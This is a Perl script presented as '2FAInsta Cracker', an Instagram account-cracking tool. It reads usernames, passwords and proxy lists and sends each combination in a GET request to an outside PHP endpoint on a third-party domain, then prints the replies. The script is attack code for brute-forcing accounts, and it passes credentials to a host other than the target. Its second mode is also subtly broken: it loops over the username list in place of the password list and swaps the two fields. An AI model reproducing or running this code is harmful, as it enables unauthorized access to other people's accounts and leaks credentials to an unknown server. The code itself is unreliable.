use LWP::UserAgent;
system('cls');
system('color 1e');
print '
###################
# Coded By 1337r00t
###################
...........................................................................
.%%%%....%%%%%%..%%%%%%..%%%%%%.......%%%%%%\...../%%%\..../%%%\....%%%%%%.
...%%........%%......%%.....(%/.......%%....%)...%:...:%..%:...:%.....%%...
...%%....%%%%%%..%%%%%%....(%/........%%%%)%.}...%:...:%..%:...:%.....%%...
...%%........%%......%%...(%/.........%%...\%)...%:...:%..%:...:%.....%%...
.%%%%%%..%%%%%%..%%%%%%..(%...........%%....\%)...\%%%/....\%%%/......%%...
...........................................................................
\n';
print qq(
#============================#
#     2FAInsta Cracker       #
#     C0ded by 1337r00t      #
#    Instagram: 1337r00t     #
#============================#\n
\n1 - With Proxy\n2 - Without Proxy\n\n> );
$do = <STDIN>;
chomp($do);
system('cls');
#######################################################################################
if ($do == 1){
	print qq(
	Enter Proxys File:
	> );
	$proxylist=<STDIN>;
	chomp($proxylist);
	open (PROXYFILE, "<$proxylist") || die "[-] Can't Found The List Of Proxys !";
	@PROXYS = <PROXYFILE>;
	close PROXYFILE;
	
	print qq(
	Enter Username :
	> );
	$user=<STDIN>;
	chomp($user);
	
	print qq(
	Enter Password :
	> );
	$pass=<STDIN>;
	chomp($pass);
	######################
		foreach $proxy (@PROXYS) {
		chomp $proxy;
			$ua = LWP::UserAgent->new();
			$request = HTTP::Request->new(GET => "http://www.mughniagent.co.uk/snapchat/proxy.php?username=$user&password=$pass&proxy=$proxy");
			$response = $ua->request($request);
			$output = $response->content();
			print "$output\n";
		}
}
##################################################################################
if ($do == 2){

print qq(
Enter Username :
> );
$user2=<STDIN>;
chomp($user2);
open (USERFILE2, "<$user2") || die "[-] Can't Found The List Of Codes !";
@USER2 = <USERFILE2>;
close USERFILE2;

print qq(
Enter Password :
> );
$pass2=<STDIN>;
chomp($pass2);
open (PASSFILE2, "<$pass2") || die "[-] Can't Found The List Of Codes !";
@PASS2 = <PASSFILE2>;
close PASSFILE2;

######################
foreach $username2 (@USER2) {
chomp $username2;
foreach $password2 (@USER2) {
chomp $password2;
	$ua2 = LWP::UserAgent->new();
	$request2 = HTTP::Request->new(GET => "http://www.mughniagent.co.uk/snapchat/proxy.php?username=$password2&password=$username2");
	$response2 = $ua2->request($request2);
	$output2 = $response2->content();
	print "$output2\n";
}
}
}
